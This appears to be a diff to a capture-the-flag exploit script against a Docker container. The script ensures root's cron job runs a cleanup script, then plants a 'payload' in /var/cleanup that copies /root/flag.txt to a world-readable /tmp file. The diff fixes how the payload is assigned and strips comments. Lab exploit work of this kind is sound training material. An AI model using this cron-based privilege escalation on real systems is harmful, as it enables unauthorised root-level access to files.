@@ -33,22 +33,17 @@ fi
 echo "[i] Verifying crond and crontab inside container..."
 set +e
 docker exec "$CONTAINER" /bin/sh -lc '
-  # Start crond if not running (use pidof or ps fallback)
   if command -v pidof >/dev/null 2>&1; then
     pidof crond >/dev/null 2>&1 || /usr/sbin/crond -l 2
   else
     ps aux | grep -q "[c]rond" || /usr/sbin/crond -l 2
   fi
-
-  # Ensure the root crontab line exists (Alpine uses /etc/crontabs/root)
   mkdir -p /etc/crontabs
   touch /etc/crontabs/root
   if ! grep -q "/usr/local/bin/cleanup.sh" /etc/crontabs/root 2>/dev/null; then
     echo "* * * * * /bin/bash /usr/local/bin/cleanup.sh >> /var/log/cleanup.log 2>&1" >> /etc/crontabs/root
   fi
   chmod 600 /etc/crontabs/root 2>/dev/null || true
-
-  # Ask crond to reload jobs (HUP) or restart
   if command -v pidof >/dev/null 2>&1 && pidof crond >/dev/null 2>&1; then
     kill -HUP "$(pidof crond | awk "{print \$1}")" 2>/dev/null || /usr/sbin/crond -l 2
   else
@@ -63,16 +58,17 @@ if [ $rc -ne 0 ]; then
 fi
 echo "[i] Cron verified."
 
-# 3) Drop the payload
-read -r -d '' PAYLOAD <<'EOF'
+# 3) Drop the payload (fixed assignment)
+PAYLOAD=$(cat <<'EOF'
 #!/usr/bin/env bash
 set -euo pipefail
 cat /root/flag.txt > /tmp/flag.out
 chmod 644 /tmp/flag.out
 EOF
+)
 
 tmpfile="$(mktemp)"
-echo "$PAYLOAD" > "$tmpfile"
+printf '%s\n' "$PAYLOAD" > "$tmpfile"
 chmod +x "$tmpfile"
 docker cp "$tmpfile" "$CONTAINER":/var/cleanup/grabflag.sh
 rm -f "$tmpfile"
@@ -81,7 +77,7 @@ echo "[i] Payload placed at /var/cleanup/grabflag.sh"
 # 4) Wait for cron to execute (up to 120s)
 echo "[i] Waiting for cron to run payload..."
 success=0
-for s in $(seq 1 24); do
+for _ in $(seq 1 24); do
   if docker exec "$CONTAINER" test -f /tmp/flag.out; then
     success=1
     break
